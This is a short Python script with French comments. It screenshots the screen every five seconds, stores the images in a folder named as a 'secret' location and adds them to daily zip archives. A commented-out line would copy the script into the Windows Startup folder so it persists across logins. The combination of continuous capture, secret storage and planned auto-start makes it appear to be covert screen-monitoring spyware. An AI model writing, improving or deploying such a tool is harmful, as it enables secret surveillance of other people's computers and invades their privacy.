import os
import datetime
import time

from shutil import copyfile

username = os.getlogin()
nomFichierActuelle = os.path.basename(__file__)

# **** AU DEMARRAGE t
#copyfile(nomFichierActuelle,f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{nomFichierActuelle}")

# **** EMPLACEMENT SAUVEGARDE
from others.variables_param import NOM_DOSSIER_SECRET,AR1
if not os.path.exists(AR1):
	os.makedirs(AR1)
nomEmplacementSauvegarde = NOM_DOSSIER_SECRET
if not os.path.exists(nomEmplacementSauvegarde):
	os.makedirs(nomEmplacementSauvegarde)


dateajd = datetime.datetime.now().strftime('%Y-%m-%d')
dateheure = datetime.datetime.now().strftime('%H:%M:%S')

nomEmplacementSauvegarde += "/" + datetime.datetime.now().strftime('%Y-%m-%d')
if not os.path.exists(nomEmplacementSauvegarde):
	os.makedirs(nomEmplacementSauvegarde)

nomEmplacementSauvegarde += "/" + "screens"
if not os.path.exists(nomEmplacementSauvegarde):
	os.makedirs(nomEmplacementSauvegarde)

# **** YEAH 
intervalles_screen = 5
import pyautogui

# **** ARCH EN DIDI
import zipfile
def go_zip(date,img):
	
	nomduZip = AR1 + "/" + date + ".zip"
	
	if not os.path.exists(nomduZip):
		mode = "w"
	else:
		mode = "a"
		
	with zipfile.ZipFile(nomduZip,mode) as my_zip:
		my_zip.write(img)
		print(f"    ~ {nomduZip} <- {img} ")
			

def capturer(temps):
	myDatetime = datetime.datetime.now()
	nomFichier= myDatetime.strftime('%Y-%m-%d-%H%M%S')
	photo = nomEmplacementSauvegarde + "/" + nomFichier + ".png"
	
	# prendre photo	
	pyautogui.screenshot(photo)
	print("# " + photo)
	
	#ajouter arc
	go_zip(dateajd,photo)
	time.sleep(temps)

while 1:
	capturer(intervalles_screen)
    

	  

